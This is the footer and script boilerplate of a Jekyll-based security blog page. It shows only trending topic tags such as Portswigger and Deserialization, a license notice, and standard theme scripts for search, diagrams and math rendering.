href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
